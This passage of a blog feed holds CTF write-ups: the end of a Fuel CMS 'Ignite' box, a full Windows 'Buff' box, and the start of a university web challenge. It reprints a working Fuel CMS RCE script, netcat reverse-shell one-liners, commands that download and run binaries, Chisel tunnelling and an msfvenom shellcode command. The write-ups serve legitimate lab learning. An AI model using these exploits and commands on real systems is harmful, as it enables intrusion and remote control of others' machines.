fingerprint:&lt;br&gt;OS:SCAN(V=7.91%E=4%D=9/16%OT=80%CT=1%CU=35981%PV=Y%DS=2%DC=T%G=Y%TM=614357F&lt;br&gt;OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS&lt;br&gt;OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1&lt;br&gt;OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN&lt;br&gt;OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A&lt;br&gt;OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R&lt;br&gt;OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F&lt;br&gt;OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%&lt;br&gt;OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD&lt;br&gt;OS:=S)&lt;/pre&gt;&lt;p&gt;The only port open is the 80 which means it has a website. I must check it!&lt;/p&gt;&lt;p&gt;Once on the web page, the only thing I see is the welcome page of a default &lt;strong&gt;Fuel CMS&lt;/strong&gt; welcome page.&lt;/p&gt;&lt;p&gt;At this point, I immediately went to check &lt;em&gt;robots.txt&lt;/em&gt;. Why &lt;em&gt;robots.txt&lt;/em&gt;?&lt;br&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Because &lt;em&gt;Nmap&lt;/em&gt; tells me about this file.&lt;img src=&quot;/cyber/writeup/ignite/37cad67d89754a1ebfd6c3705b710249.png&quot;&gt;&lt;/li&gt;&lt;li&gt;It is a good practice to check it you never know.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;The file &lt;em&gt;robots.txt&lt;/em&gt; show as follows:&lt;/p&gt;&lt;pre&gt;User-agent: *&lt;br&gt;Disallow: /fuel/&lt;/pre&gt;&lt;p&gt;So let me check the path. It leads to the login page of the cms.&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/ignite/6599a6a905b64b6386f9fa3348d6cb6f.png&quot;&gt;&lt;p&gt;Since I don&apos;t have the credentials, the only thing I can think of to do is to try the default Fuel CMS credentials which turn out to be &lt;code&gt;admin:admin&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Once logged in and taking a look around I found an upload page.&lt;br&gt;&lt;img src=&quot;/cyber/writeup/ignite/777da69cd431492d8df35bdc14d859ad.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Now, I have tried many php reverse shell pages taken from GitHub and Pentestmonkey but none of them worked and keep giving me errors.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/ignite/438cf6338e214538ab4339d52ee67b31.png&quot;&gt;&lt;/p&gt;&lt;p&gt;After some research, it seems that to fix this error I have to get my hands on the php configuration file which is not possible for me at the moment.&lt;br&gt;&lt;a href=&apos;https://stackoverflow.com/questions/45992685/php-parse-error-syntax-error-unexpected-in-helpers-php-233&apos;&gt;php-parse-error-syntax-error-unexpected-in-helpers-php-233&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;I have spent quite a lot of time at this point trying to write a better reverse shell in PHP in order to upload but I think it is a &lt;a data-from-md title=&apos;https:/medium.com/@luke.williams1248/on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5&apos; href=&apos;https://medium.com/@luke.williams1248on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5&apos;&gt;RabbitHole&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Then I moved on and tried another way.&lt;/p&gt;&lt;p&gt;Now I take a step back and see what other information I have.&lt;/p&gt;&lt;p&gt;Getting back on the main Fuel CMS page I can see the version installed, so the first thing that comes to my mind is that it might have a vulnerability and an exploit.&lt;/p&gt;&lt;p&gt;So I search with &lt;code&gt;searchsploit fuel&lt;/code&gt;.&lt;/p&gt;&lt;pre&gt;searchsploit fuel                  &lt;br&gt;-------------------------------------------------------------------------------------- ---------------------------------&lt;br&gt; Exploit Title                                                                        |  Path&lt;br&gt;-------------------------------------------------------------------------------------- ---------------------------------&lt;br&gt;AMD Fuel Service - &apos;Fuel.service&apos; Unquote Service Path                                | windows/local/49535.txt&lt;br&gt;Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                     | hardware/webapps/31180.txt&lt;br&gt;fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py&lt;br&gt;Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb&lt;br&gt;Fuel CMS 1.4.7 - &apos;col&apos; SQL Injection (Authenticated)                                  | php/webapps/48741.txt&lt;br&gt;Fuel CMS 1.4.8 - &apos;fuel_replace_id&apos; SQL Injection (Authenticated)                      | php/webapps/48778.txt&lt;br&gt;-------------------------------------------------------------------------------------- ---------------------------------&lt;br&gt;Shellcodes: No Results&lt;br&gt;&lt;pre&gt;&lt;p&gt;Among all those, the one that convinces me the most is the Python RCE, called &lt;strong&gt;Remote Code Execution (1)&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;To copy it I can &lt;code&gt;searchsploit -m 47138&lt;/code&gt; (without the file format &lt;em&gt;.py&lt;/em&gt;)&lt;/p&gt;&lt;pre&gt;┌──(benwick㉿benwick)-[~]&lt;br&gt;└─$ searchsploit -m 47138&lt;br&gt;  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)&lt;br&gt;      URL: https://www.exploit-db.com/exploits/47138&lt;br&gt;     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py&lt;br&gt;File Type: Python script, ASCII text executable&lt;br&gt;&lt;br&gt;Copied to: /home/kali/47138.py&lt;br&gt;&lt;/pre&gt;&lt;p&gt;Now I have to set the exploit properly. By opening the code I can see that it is using a proxy in order to communicate with the remote target which I don&apos;t want so I readjust the code.&lt;/p&gt;&lt;pre class=&quot;python-code&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;url&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;http://10.10.81.104&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;find_nth_overlapping&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;haystack&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;needle&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;n&lt;/span&gt;):&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;start&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;haystack&lt;/span&gt;.find(&lt;span class=&quot;variable&quot;&gt;needle&lt;/span&gt;)&lt;br&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;start&lt;/span&gt; &gt;= 0 &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;n&lt;/span&gt; &gt; 1:&lt;br&gt;        &lt;span class=&quot;variable&quot;&gt;start&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;haystack&lt;/span&gt;.find(&lt;span class=&quot;variable&quot;&gt;needle&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;start&lt;/span&gt;+1)&lt;br&gt;        &lt;span class=&quot;variable&quot;&gt;n&lt;/span&gt; -= 1&lt;br&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;start&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; 1:&lt;br&gt;    xxxx = raw_input(&lt;span class=&quot;string&quot;&gt;&quot;cmd:&quot;&lt;/span&gt;)&lt;br&gt;    burp0_url = &lt;span class=&quot;variable&quot;&gt;url&lt;/span&gt;+&lt;span class=&quot;string&quot;&gt;&quot;/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27&quot;&lt;/span&gt;\&lt;br&gt;+urllib.quote(&lt;span class=&quot;variable&quot;&gt;xxxx&lt;/span&gt;)+&lt;span class=&quot;string&quot;&gt;&quot;%27%29%2b%27&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;comment&quot;&gt;#proxy = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}&lt;/span&gt;&lt;br&gt;    r = requests.get(&lt;span class=&quot;variable&quot;&gt;burp0_url&lt;/span&gt;)&lt;span class=&quot;comment&quot;&gt;#, proxies=proxy)&lt;/span&gt;&lt;br&gt;&lt;br&gt;    html = &lt;span class=&quot;string&quot;&gt;&quot;&lt;!DOCTYPE html&gt;&quot;&lt;/span&gt;&lt;br&gt;    htmlcharset = r.text.find(&lt;span class=&quot;variable&quot;&gt;html&lt;/span&gt;)&lt;br&gt;&lt;br&gt;    begin = r.text[0:20]&lt;br&gt;    dup = &lt;span class=&quot;function&quot;&gt;find_nth_overlapping&lt;/span&gt;(r.text, &lt;span class=&quot;variable&quot;&gt;begin&lt;/span&gt;, 2)&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;function&quot;&gt;print&lt;/span&gt; r.text[0:dup]&lt;br&gt;&lt;/pre&gt;&lt;p&gt;Now that I have removed part of the code and set the url to the target url I am ready to execute it in order to get RCE.&lt;/p&gt;&lt;p&gt;NOTE: It is a Python script, at the time I wrote this writeup (17/09/2021) in every Linux distro python3 is the default Python and in most of them python2 is not even installed.&lt;br&gt;I had a few errors on running the script because I was executing the script with just &lt;code&gt;./47138.py&lt;/code&gt; which uses python3 by default but this code seems working with python2 so I had to use &lt;code&gt;python2 47138.py&lt;/code&gt; and managed to run it successfullyZ.&lt;/p&gt;&lt;pre&gt;┌──(benwick㉿benwick)-[~]&lt;br&gt;└─$ python2 ./47138.py &lt;br&gt;cmd:&lt;br&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;The shell I got is limiting me, and can not travel the directories. It means I need a better shell so I need a reverse shell.&lt;/p&gt;&lt;p&gt;The first thing to do is to open a Netcat listener: &lt;code&gt;nc -lvnp 1234&lt;/code&gt;&lt;/p&gt;&lt;p&gt;I used the pentestermonkey website to get the reverse shell command which is:&lt;br&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f&lt;/code&gt;&lt;br&gt;and changed the IP address with the target address.&lt;/p&gt;&lt;p&gt;NOTE: Why did I use the previous command and not the other one on the site which is shorter and easier to understand?&lt;br&gt;&lt;code&gt;nc -e /bin/sh 10.0.0.1 1234&lt;/code&gt;. This simply didn&apos;t work, I tried both.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/ignite/70ffe32a7e9a44ba9336716b1f3b523b.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Now I can freely navigate and get the flag from the user folder.&lt;br&gt;&lt;img src=&quot;/cyber/writeup/ignite/622d46e05de64b6cbd50c59b191e9825.png&quot;&gt;&lt;/p&gt;&lt;p&gt;As &lt;a href=&quot;https://www.linkedin.com/in/ippsec/&quot;  target=&quot;blank&quot; rel=&quot;noopener noreferrer&quot;&gt;IPPSec&lt;/a&gt; teaches one, the best way to enumerate a machine is through linpeas (winpeas). Once downloaded and run (no details about these steps because it failed) it gave a huge report that leads nowhere.&lt;/p&gt;&lt;p&gt;At this point, I started looking at the files in the &lt;strong&gt;/var/www/html/fuel&lt;/strong&gt; folder.&lt;/p&gt;&lt;p&gt;Why in particular this folder? No particular reason this is the folder from where I started and need to check the whole box so eventually I will check this. I am lucky because the solution for the next step is here.&lt;/p&gt;&lt;p&gt;By navigating inside the folder at a certain point I reached the file &lt;strong&gt;/var/www/html/fuel/application/config/database.php&lt;/strong&gt; which contains the password for the administrator account.&lt;/p&gt;&lt;p&gt;To view the file I can just &lt;code&gt;cat database.php&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/ignite/815d893c60c049aa83450ce0bca3e3da.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Sometimes happens that simpli using the &lt;code&gt;cat&lt;/code&gt; command doesn&apos;t work and it says: &lt;i&gt;Command : must be run from a terminal&lt;/i&gt;. In order to have a better shell I can run the following command:&lt;code&gt;python -c &apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&apos;&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/ignite/0364d820431744c1a5604b168e6c7eac.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Finally, to get the root flag I have to elevate the privilege. While I have the username and the password I can simply switch the user &lt;code&gt;su root&lt;/code&gt; and enter the password to become root and read the root flag.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/ignite/1a5ee7c350e04dfb873ad7f82f23537e.png&quot;&gt;&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="oscp"/>
        
          <category term="box"/>
        
          <category term="thm"/>
        
          <category term="web"/>
        
          <category term="cms"/>
        
          <category term="fuelcms"/>
        
          <category term="apache 2.4.18"/>
        
          <category term="reverse shell"/>
        
          <category term="rce"/>
        
          <category term="php"/>
        
          <category term="cve"/>
        
          <category term="http 80"/>
        
          <category term="linux"/>
        
          <category term="nc"/>
        
          <category term="upgrade shell"/>
        
          <category term="privesc"/>
        
      </item>
    
      <item>
        <title>Buff</title>
        <link href="https://benwick921.github.io/cyber/writeup/buff/" rel="alternate" type="text/html" title="Buff"/>
        <guid>https://benwick921.github.io/cyber/writeup/buff/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/buff/banner.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;pre&gt;PORT     STATE SERVICE    VERSION&lt;br&gt;7680/tcp open  pando-pub?&lt;br&gt;8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)&lt;/pre&gt;&lt;br&gt;&lt;p&gt;The scanning reveals that there is a webserver running on port 8080 so I go to check it hoping to find some interesting information. In the page &lt;i&gt;contact&lt;/i&gt;there is a information about the sofware used to build the site which is&lt;i&gt;Gym Manager Software 1.0&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/buff/394c824c975047da8772b922fcbc9b46.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Searching a vulnerability or and exploit for, leads me to &lt;a data-from-md title=&apos;https://www.exploit-db.com/exploits/48506&apos; href=&apos;https://www.exploit-db.com/exploits/48506&apos;&gt;https://www.exploit-db.com/exploits/48506&lt;/a&gt;. Then I donwloaded and run it as &lt;code&gt;python 48506.py http://10.10.10.198:8080/&lt;/code&gt; and it ended up exploiting the software and giving me a shell. I can&apos;t do much with this shell, I cant change directory or do any other stuff so I need to upgrade the shell.&lt;/p&gt;&lt;p&gt;In order to do so I decided to download Netcat (nc) to the server and it includes a few steps:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Open a web server in my Kali inside my Buff folder that I created to solve the box where I have all the exploits and programs &lt;code&gt;sudo python3 -m http.server 8080&lt;/code&gt;&lt;br&gt; &lt;img src=&quot;/cyber/writeup/buff/56bd6f9c0943430d9b1e04b84c11a092.png&quot;&gt;&lt;/li&gt;&lt;li&gt;From the box I can connect to the Python HTTP server and download files, to do that there are two ways:&lt;ol&gt;&lt;li&gt;&lt;code&gt;powershell iwr http://10.10.14.197:8080:/nc.exe -outf nc.exe&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;curl http://10.10.14.197:8080/nc.exe -o nc.exe&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;/cyber/writeup/buff/a9274a65c7384c498436604953f1e81e.png&quot;&gt;&lt;br&gt;In the directory, there are also other users artefacts.&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Once Downloaded I open a listener on my Kali &lt;code&gt;nc -lvp 4444&lt;/code&gt; and a client on the box in a way that upon connecting it will execute a command &lt;code&gt;nc.exe 10.10.14.197 4444 -e cmd.exe&lt;/code&gt; it will result in having a command of the box on my kali machine.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/buff/bf06f1f38deb40e19379033fd6329abe.png&quot;&gt;&lt;br&gt;&lt;p&gt;Once got the shell I can move to the location of the user flag&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/buff/ff20b0d447b54c38909325cbea503bca.png&quot;&gt;&lt;br&gt;&lt;p&gt;To search a vulnerable process its possible to use &lt;code&gt;winpeas.exe&lt;/code&gt; but in my case I checked one by one and search for them on google to see which one is vulnerable and I ended up finding &lt;code&gt;CloudMe.exe&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Searching for an exploit I ended up finding many and various versions of Cloudme’s version.&lt;/p&gt;&lt;p&gt;While I don&apos;t have administrator privilege I can&apos;t see the version of the program with &lt;code&gt;tasklist&lt;/code&gt; or &lt;code&gt;Get-Proces&lt;/code&gt; so I had to look around to see if I find something. In the end, the executable was in the &lt;code&gt;Shaun&lt;/code&gt; user’s Download folder, which contains also the version number in the name.&lt;br&gt;&lt;img src=&quot;/cyber/writeup/buff/3b6f506a74344ceabfef62b8cdacb5a5.png&quot;&gt;&lt;br&gt;&lt;p&gt;I noticed that CloudMe runs on localhost port 8888 so there is no chance that I can remotely exploit it and neither locally because the script is in Python and it is not installed in the box. So I used &lt;b&gt;Chisel&lt;/b&gt; to forward the connection. I had to donwload a precompiled version for Windows and Linux from &lt;a data-from-md title=&apos;https://github.com/jpillora/chisel/releases/&apos; href=&apos;https://github.com/jpillora/chisel/releases/&apos;&gt;https://github.com/jpillora/chisel/releases/&lt;/a&gt;. I loaded Chisel in the box in the same way as Netcat. From my Kali machine, I opened a server as shown in &lt;a data-from-md title=&apos;https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html&apos; href=&apos;https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html&apos;&gt;https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html&lt;/a&gt;&lt;br&gt; &lt;code&gt;./chisel server -p 7777 --reverse&lt;/code&gt; and a client in the box as &lt;code&gt;chisel client 10.10.14.187:7777 R:8888:127.0.0.1:8888&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;/cyber/writeup/buff/18cc7f4ffbdb4c4a97f31ff0a6bdc1f0.png&quot;&gt;&lt;br&gt;&lt;p&gt;Now my choice of exploit comes down to four possibilities.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/buff/dce0e1743ade4d6cbee6d9b255793b64.png&quot;&gt;&lt;/p&gt;&lt;p&gt;And I chose the PoC one.&lt;/p&gt;After opening the exploit it suggested a command line to enumerate a shellcode, so I generated a shellcode that I needed in order to exploit CloudMe and give a reverse shell. &lt;code&gt;msfvenom -a x86 -p windows/exec CMD=&apos;C:\xampp\htdocs\gym\upload
c.exe 10.10.14.197 1111 -e cmd.exe&apos; -b &apos;\x00\x0A\x0D&apos; -f python&lt;/code&gt; Now I have replaced the new shell code with the old one inside the script. Once exploited the CloudMe, it will invoke &lt;b&gt;nc.exe&lt;/b&gt; and try to connect to my Kali machine so before that I have to listen in port 1111. And run the exploit from another shell.&lt;br&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/buff/9f79a8643caa4742af026633b9a6cad5.png&quot;&gt;&lt;/p&gt;&lt;p&gt;The root flag in on the administrator desktop.&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="box"/>
        
          <category term="htb"/>
        
          <category term="web"/>
        
          <category term="cms"/>
        
          <category term="powershell"/>
        
          <category term="iwr"/>
        
          <category term="python webserver"/>
        
          <category term="apache 2.4.43"/>
        
          <category term="chisel"/>
        
          <category term="cloudme 1.11.2"/>
        
          <category term="curl"/>
        
          <category term="download file"/>
        
          <category term="nsfvenom"/>
        
          <category term="port forwarding"/>
        
          <category term="powershell iwr"/>
        
          <category term="windows"/>
        
          <category term="winpeas"/>
        
          <category term="Gym Manager 1.0"/>
        
          <category term="privesc"/>
        
      </item>
    
      <item>
        <title>University CTF</title>
        <link href="https://benwick921.github.io/cyber/writeup/uni-ctf/" rel="alternate" type="text/html" title="University CTF"/>
        <guid>https://benwick921.github.io/cyber/writeup/uni-ctf/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/unictf/banner.webp&quot; alt=&quot;&quot;&gt;&lt;hr&gt;&lt;p&gt;This was my university CTF during my Masters&apos; degree in Cybersecurity, we compeeted in team and I was paired with one of my university colleague and friend and we completed all the challenges. At that time I was at the start of my journe in the Cybersecurity field, even if now theese challenges seels really easy at during that period was enlighting and they tought me many things about web and web security.&lt;/p&gt;&lt;p&gt;This writeup is written in a way to show not only the solution but also my process and my thinking behind and action. I believe that learning skills is relatively easy thanks to various resources available for free but the hardest part is to have the right mindset to approach the challenges.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;The URL of the first level was given as the starting point:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55001/eishohwohpahxooy/&lt;/code&gt;&lt;/p&gt;&lt;p&gt;As stated during the Web Security Challenges lectures, the first thing to do when trying to hack a web page was to actually use the web page as it was supposed to be used. So, in other words, you simply do what the web page asks you to do.&lt;/p&gt;&lt;p&gt;Therefore, we first tried to log in by inserting a random username and password, as requested from the web page itself.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image18.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As we expected we received an error:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image28.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Then, we tried to dig further inspecting the web page&amp;rsquo;s source code.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image63.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;We observed  in the form above that on clicking Submit we actually call a function named &lt;em&gt;verify&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;So, we started looking for a function called verify in the Console section (right click - inspect element).&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image43.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As seen from the picture above, we found the function Verify. Now jumping into the definition of the function, to check in detail what was the Verify function supposed to do.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image64.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;I was in plaintext in the &lt;code&gt;if&lt;/code&gt; condition highlighted in red, the password and the username needed in order to access the web page.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image86.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Once solved the Level 1, the URL of the second level was found:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55043/zeitaeveishiidef&lt;/code&gt;&lt;/p&gt;&lt;p&gt;This was how the Level 2 looked like:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image67.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;In this level there was only the possibility to insert a password, there was no username. So, let&amp;rsquo;s try to insert a random password.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image72.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Well, wrong password! As done in the previous level, we tried to look further by analyzing the source code.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image70.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Reading the first lines we could clearly see that there was a function implementation, the function seems to encrypt the text inserted in the password field, with MD5 function. The first idea was to decrypt what seems to be a ciphertext in the &lt;code&gt;if&lt;/code&gt; condition.&lt;/p&gt;&lt;p&gt;After using numerous MD5 online decrypters without success, we decide to keep on reading the source code. While having a closer look at it, we noticed two images references in the inspector section: one was a reference to the picture in the home page &amp;ldquo;kitten.jpg&amp;rdquo; and the other one was a picture with a hidden parameter &amp;ldquo;srct.png&amp;rdquo;.&lt;/p&gt;&lt;p&gt;Putting the cursor on top of the reference &lt;em&gt;scrt.png&lt;/em&gt; a window popped up with a text.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image77.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The text on the picture was the right password to insert in order to solve the level.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;As usual, in the previous level, we found the link to access the next one:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55208/bahjeighahveerae/cgi-bin/index.php&lt;/code&gt;&lt;/p&gt;&lt;p&gt;As tried before, as a first step when trying to relate to a new web page, we tried to follow the natural instructions of the web page itself, this time trying to insert a username and password. We decided to try with some random and basic combination of username and password (e.g. &lt;em&gt;admin:admin&lt;/em&gt;).&lt;/p&gt;&lt;p&gt;As we expected, we received the following error message:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image73.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;So, we analyzed the source code once again.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image75.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;In the source code, we found a hidden parameter with a “False” value, we inspected the web page source code proceeded by changing the value from False to True, and submitted the form.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image78.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;After applying the above-mentioned changes, we finally obtaine the page with the URL of the next level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image80.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;This was the URL for the Level 4:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55192/ogheucaiheikohhi&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image82.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;This level consisted of verifying our browser in order to have access.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image84.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Only connections from &lt;em&gt;Kevin Browser Rocks&lt;/em&gt; were accepted.&lt;/p&gt;&lt;p&gt;What we had to do was to pretend to be using the browser “Kevin Browser Rocks” by changing the headers in our browser. In order to do that we useded an extension (Simple Modify Headers, on Firefox) that modifies the header and we set it up to do it during the requests.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image87.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;As we can see we modified our browser &lt;code&gt;user-agent&lt;/code&gt; to &lt;em&gt;Kevin Browser Rocks&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image89.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Nice! Now the page accepted only connections from Russian (.ru) websites. We have our extension and we can also use it to simulate Russian connection by changing our browser referrer.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image89.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;By applying this new change, we could finally get the URL to access the new level.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image90.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;This was the URL obtained to access the fifth level:&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://eth-lab.di.uniroma1.it:55051/iengohquoochieza/&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image47.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The first thing we did was to analyze the source code.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/unictf/image49.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;“Never show secret.txt to the users”&lt;/em&gt;, this caught our 